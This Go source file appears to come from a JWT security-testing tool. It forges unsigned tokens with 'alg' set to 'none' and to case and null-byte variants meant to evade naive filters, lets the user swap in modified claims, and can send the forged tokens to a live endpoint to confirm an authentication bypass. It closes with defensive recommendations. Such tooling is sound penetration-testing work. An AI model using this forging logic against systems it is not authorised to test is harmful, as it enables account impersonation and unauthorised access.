package main

import (
	"encoding/json"
	"fmt"
	"log"
	"strings"
)

// noneVariants contains all known case/encoding variants that bypass naive
// "alg":"none" string matching filters.
var noneVariants = []string{
	"none",
	"None",
	"NONE",
	"nOnE",
	"none\x00", // null byte truncation
	"nul",
	"Nul",
	"NULL",
}

// testNoneAlg tests the alg=none signature bypass vulnerability.
// FIX: Now tests all case variants and null-byte truncation, not just lowercase "none".
func testNoneAlg(cfg *Config) {
	if cfg.Endpoint != "" && !confirmOnline(cfg) {
		return
	}

	header, payload, _, err := decodeTokenParts(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to decode token: %v", err)
	}

	// Apply modified claims if specified
	var modifiedPayload map[string]interface{}
	if cfg.ModifiedClaims != "" {
		if err := json.Unmarshal([]byte(cfg.ModifiedClaims), &modifiedPayload); err != nil {
			log.Fatalf("Failed to parse modified claims JSON: %v", err)
		}
	} else {
		modifiedPayload = payload
	}

	report := Report{}
	found := false

	for _, variant := range noneVariants {
		// Copy header and set the variant algorithm
		headerCopy := make(map[string]interface{})
		for k, v := range header {
			headerCopy[k] = v
		}
		headerCopy["alg"] = variant
		// Remove typ if not present originally; keep for compatibility
		if _, ok := headerCopy["typ"]; !ok {
			headerCopy["typ"] = "JWT"
		}

		headerEnc, err := encodeTokenPart(headerCopy)
		if err != nil {
			continue
		}
		payloadEnc, err := encodeTokenPart(modifiedPayload)
		if err != nil {
			continue
		}

		// Unsigned token: header.payload. (empty signature)
		forged := headerEnc + "." + payloadEnc + "."

		displayVariant := strings.ReplaceAll(variant, "\x00", "\\x00")

		if cfg.Endpoint == "" {
			// Offline mode: generate and display forged tokens
			fmt.Printf("[%s] Forged token: %s\n", displayVariant, forged)
			addResult(&report, newResult(
				fmt.Sprintf("alg=%s bypass (offline)", displayVariant),
				"Algorithm",
				"CRITICAL",
				fmt.Sprintf("Generated unsigned token with alg=%s. If the server accepts "+
					"tokens without signature verification, authentication is bypassed.", displayVariant),
			))
			report.Logs = append(report.Logs, forged)
			found = true
		} else {
			// Online mode: send to endpoint and check
			accepted, status, body := sendTokenAndCheck(cfg, forged)
			if accepted {
				fmt.Printf("[VULNERABLE] alg=%s accepted! Status: %d\n", displayVariant, status)
				addResult(&report, newResult(
					fmt.Sprintf("alg=%s bypass (confirmed)", displayVariant),
					"Algorithm",
					"CRITICAL",
					fmt.Sprintf("Server accepted unsigned token with alg=%s (HTTP %d). "+
						"Authentication bypass confirmed.", displayVariant, status),
				))
				bodyPreview := body
				if len(bodyPreview) > 200 {
					bodyPreview = bodyPreview[:200]
				}
				report.Logs = append(report.Logs, "Token: "+forged+" | Response: "+bodyPreview)
				found = true
				break // One confirmed variant is sufficient
			} else {
				fmt.Printf("[SAFE] alg=%s rejected (status %d)\n", displayVariant, status)
			}
		}
	}

	if !found {
		if cfg.Endpoint != "" {
			addResult(&report, newResult(
				"alg=none bypass (not vulnerable)",
				"Algorithm",
				"INFO",
				"All none algorithm variants were rejected by the server",
			))
		}
		report.Logs = append(report.Logs, "No none variant was accepted")
	}

	report.Recommendations = append(report.Recommendations,
		"Explicitly specify algorithms whitelist in verify(): algorithms=['RS256']",
		"Reject 'none' algorithm in production",
		"Never use decode() instead of verify()",
	)
	writeReport(cfg.ReportFile, report)
}
